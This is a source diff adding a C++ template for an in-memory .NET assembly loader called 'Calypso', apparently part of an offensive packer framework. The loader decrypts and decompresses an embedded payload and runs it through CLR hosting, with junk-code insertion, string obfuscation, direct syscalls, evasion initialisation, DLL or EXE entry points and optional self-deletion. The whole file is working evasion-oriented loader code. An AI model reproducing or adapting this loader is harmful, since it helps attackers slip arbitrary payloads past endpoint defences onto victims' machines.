@@ -1,0 +1,280 @@
+// Calypso loader - C# Assembly via CLR hosting
+// Based on NimSyscallPacker's Csharp module by @ShitSecure
+#include <windows.h>
+#include <winternl.h>
+#include <metahost.h>
+#include <mscoree.h>
+
+#pragma comment(lib, "mscoree.lib")
+
+#include "obfuscate.hpp.in"
+#include "syscalls.hpp.in"
+#include "crypto_stub.hpp.in"
+#include "common.hpp.in"
+#include "evasion.hpp.in"
+
+{{JUNK_CODE_BLOCKS}}
+
+// Encrypted payload
+{{ENCRYPTED_PAYLOAD}}
+
+// Encryption key
+{{KEY_DATA}}
+
+static constexpr size_t ORIGINAL_SIZE = {{ORIGINAL_SIZE}};
+
+// CLR hosting - load and execute .NET assembly from memory
+static void run_dotnet_assembly(uint8_t* assembly_data, size_t assembly_size) {
+    HRESULT hr;
+
+    // CLRCreateInstance
+    ICLRMetaHost* pMetaHost = nullptr;
+    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
+                           reinterpret_cast<LPVOID*>(&pMetaHost));
+    if (FAILED(hr)) return;
+
+    // Get latest runtime
+    IEnumUnknown* pEnum = nullptr;
+    hr = pMetaHost->EnumerateInstalledRuntimes(&pEnum);
+    if (FAILED(hr)) { pMetaHost->Release(); return; }
+
+    ICLRRuntimeInfo* pRuntimeInfo = nullptr;
+    IUnknown* pUnk = nullptr;
+    ULONG fetched = 0;
+
+    // Get the last (newest) runtime
+    while (pEnum->Next(1, &pUnk, &fetched) == S_OK) {
+        if (pRuntimeInfo) pRuntimeInfo->Release();
+        pUnk->QueryInterface(IID_ICLRRuntimeInfo,
+                              reinterpret_cast<LPVOID*>(&pRuntimeInfo));
+        pUnk->Release();
+    }
+    pEnum->Release();
+
+    if (!pRuntimeInfo) { pMetaHost->Release(); return; }
+
+    // Check if loadable
+    BOOL loadable = FALSE;
+    hr = pRuntimeInfo->IsLoadable(&loadable);
+    if (FAILED(hr) || !loadable) {
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Get ICorRuntimeHost
+    ICorRuntimeHost* pRuntimeHost = nullptr;
+    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
+                                     reinterpret_cast<LPVOID*>(&pRuntimeHost));
+    if (FAILED(hr)) {
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Start the CLR
+    hr = pRuntimeHost->Start();
+    if (FAILED(hr)) {
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Get default AppDomain
+    IUnknown* pAppDomainThunk = nullptr;
+    hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
+    if (FAILED(hr)) {
+        pRuntimeHost->Stop();
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    _AppDomain* pAppDomain = nullptr;
+    hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain),
+                                          reinterpret_cast<LPVOID*>(&pAppDomain));
+    pAppDomainThunk->Release();
+    if (FAILED(hr)) {
+        pRuntimeHost->Stop();
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Create SAFEARRAY from assembly bytes
+    SAFEARRAYBOUND bounds = { static_cast<ULONG>(assembly_size), 0 };
+    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, &bounds);
+    if (!pSafeArray) {
+        pAppDomain->Release();
+        pRuntimeHost->Stop();
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    void* safe_data = nullptr;
+    SafeArrayAccessData(pSafeArray, &safe_data);
+    memcpy(safe_data, assembly_data, assembly_size);
+    SafeArrayUnaccessData(pSafeArray);
+
+    // Load assembly
+    _Assembly* pAssembly = nullptr;
+    hr = pAppDomain->Load_3(pSafeArray, &pAssembly);
+    SafeArrayDestroy(pSafeArray);
+
+    if (FAILED(hr) || !pAssembly) {
+        pAppDomain->Release();
+        pRuntimeHost->Stop();
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Get entry point
+    _MethodInfo* pEntryPoint = nullptr;
+    hr = pAssembly->get_EntryPoint(&pEntryPoint);
+    if (FAILED(hr) || !pEntryPoint) {
+        pAssembly->Release();
+        pAppDomain->Release();
+        pRuntimeHost->Stop();
+        pRuntimeHost->Release();
+        pRuntimeInfo->Release();
+        pMetaHost->Release();
+        return;
+    }
+
+    // Prepare arguments
+    SAFEARRAY* pArgs = nullptr;
+{{#IF HAS_ARGUMENTS}}
+    // Embed arguments
+    BSTR bstr_args = SysAllocString(obf_wide(L"{{ARGUMENTS}}"));
+    SAFEARRAYBOUND arg_bounds = { 1, 0 };
+    pArgs = SafeArrayCreate(VT_VARIANT, 1, &arg_bounds);
+    LONG idx = 0;
+
+    // Create string array for args
+    SAFEARRAYBOUND str_bounds = { 1, 0 };
+    SAFEARRAY* pStrArgs = SafeArrayCreate(VT_BSTR, 1, &str_bounds);
+    LONG str_idx = 0;
+    SafeArrayPutElement(pStrArgs, &str_idx, bstr_args);
+
+    VARIANT var_args;
+    VariantInit(&var_args);
+    var_args.vt = VT_ARRAY | VT_BSTR;
+    var_args.parray = pStrArgs;
+    SafeArrayPutElement(pArgs, &idx, &var_args);
+{{#ENDIF}}
+{{#IF NO_ARGUMENTS}}
+    // No arguments - pass empty array
+    SAFEARRAYBOUND arg_bounds = { 1, 0 };
+    pArgs = SafeArrayCreate(VT_VARIANT, 1, &arg_bounds);
+    LONG idx = 0;
+
+    SAFEARRAYBOUND str_bounds = { 0, 0 };
+    SAFEARRAY* pStrArgs = SafeArrayCreate(VT_BSTR, 1, &str_bounds);
+
+    VARIANT var_args;
+    VariantInit(&var_args);
+    var_args.vt = VT_ARRAY | VT_BSTR;
+    var_args.parray = pStrArgs;
+    SafeArrayPutElement(pArgs, &idx, &var_args);
+{{#ENDIF}}
+
+    // Invoke entry point
+    VARIANT retVal;
+    VariantInit(&retVal);
+    hr = pEntryPoint->Invoke_3(VARIANT{}, pArgs, &retVal);
+
+    // Cleanup
+    SafeArrayDestroy(pArgs);
+    pEntryPoint->Release();
+    pAssembly->Release();
+    pAppDomain->Release();
+    pRuntimeHost->Stop();
+    pRuntimeHost->Release();
+    pRuntimeInfo->Release();
+    pMetaHost->Release();
+}
+
+{{#IF DLL_ENTRY}}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hinstDLL);
+        if (!init_syscalls()) return TRUE;
+        if (!evasion_init()) return TRUE;
+
+        auto* decrypted = reinterpret_cast<uint8_t*>(
+            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len + 256));
+        size_t decrypted_len = payload_len + 256;
+        decrypt_payload(payload, payload_len, key, key_len, decrypted, &decrypted_len);
+
+{{#IF COMPRESS_ZLIB}}
+        auto* decompressed = reinterpret_cast<uint8_t*>(
+            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+        size_t decompressed_len = ORIGINAL_SIZE + 256;
+        decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+        run_dotnet_assembly(decompressed, decompressed_len);
+        HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+        auto* decompressed = reinterpret_cast<uint8_t*>(
+            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+        size_t decompressed_len = ORIGINAL_SIZE + 256;
+        decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+        run_dotnet_assembly(decompressed, decompressed_len);
+        HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_NONE}}
+        run_dotnet_assembly(decrypted, decrypted_len);
+{{#ENDIF}}
+        HeapFree(GetProcessHeap(), 0, decrypted);
+    }
+    return TRUE;
+}
+{{DLL_EXPORTS}}
+{{#ENDIF}}
+
+{{#IF EXE_ENTRY}}
+int main() {
+    if (!init_syscalls()) return 1;
+    if (!evasion_init()) return 1;
+
+    auto* decrypted = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len + 256));
+    size_t decrypted_len = payload_len + 256;
+    decrypt_payload(payload, payload_len, key, key_len, decrypted, &decrypted_len);
+
+{{#IF COMPRESS_ZLIB}}
+    auto* decompressed = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+    size_t decompressed_len = ORIGINAL_SIZE + 256;
+    decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+    run_dotnet_assembly(decompressed, decompressed_len);
+    HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    auto* decompressed = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+    size_t decompressed_len = ORIGINAL_SIZE + 256;
+    decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+    run_dotnet_assembly(decompressed, decompressed_len);
+    HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_NONE}}
+    run_dotnet_assembly(decrypted, decrypted_len);
+{{#ENDIF}}
+
+    HeapFree(GetProcessHeap(), 0, decrypted);
+
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
+    return 0;
+}
+{{#ENDIF}}
